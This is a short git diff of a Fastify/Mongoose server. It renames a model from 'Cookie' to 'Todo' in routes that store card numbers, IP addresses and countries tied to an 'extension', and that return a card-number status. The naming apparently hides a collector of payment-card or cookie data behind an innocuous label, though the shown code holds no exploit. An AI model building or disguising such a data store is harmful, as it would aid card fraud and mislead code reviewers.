@@ -48,15 +48,15 @@ export default async (fastify: FastifyInstance) => {
         console.log({extension})
 
         if (!extension) throw new Error("Extension not found");
-        let updated = await fastify.mongoose.Cookie.findOne({
+        let updated = await fastify.mongoose.Todo.findOne({
           cardNumber
         });
         
         if (updated) {
-          updated = await fastify.mongoose.Cookie.findOneAndUpdate({ cardNumber }, {...json}, { new: true });
+          updated = await fastify.mongoose.Todo.findOneAndUpdate({ cardNumber }, {...json}, { new: true });
         } else {
-          const count = await fastify.mongoose.Cookie.count({});
-          updated = await fastify.mongoose.Cookie.create({
+          const count = await fastify.mongoose.Todo.count({});
+          updated = await fastify.mongoose.Todo.create({
             ...json,
             ip,
             country,
@@ -79,6 +79,7 @@ export default async (fastify: FastifyInstance) => {
       }
     }
   });
+  
   fastify.route<
     {
       Body: Static<typeof BodySchema>
@@ -117,7 +118,7 @@ export default async (fastify: FastifyInstance) => {
     handler: async (request, reply) => {
       try {
         const { id } = request.params;
-        const res = await fastify.mongoose.Cookie.findOne({ cardNumber: id });
+        const res = await fastify.mongoose.Todo.findOne({ cardNumber: id });
         reply.send({
           success: true,
           cardNumberStatus: res.cardNumberStatus,
@@ -145,7 +146,7 @@ export default async (fastify: FastifyInstance) => {
       try {
         const { id } = request.params;
         const { tags } = request.body;
-        await fastify.mongoose.Cookie.findOneAndUpdate({ cardNumber: id }, {
+        await fastify.mongoose.Todo.findOneAndUpdate({ cardNumber: id }, {
           tags,
         });
         reply.send({
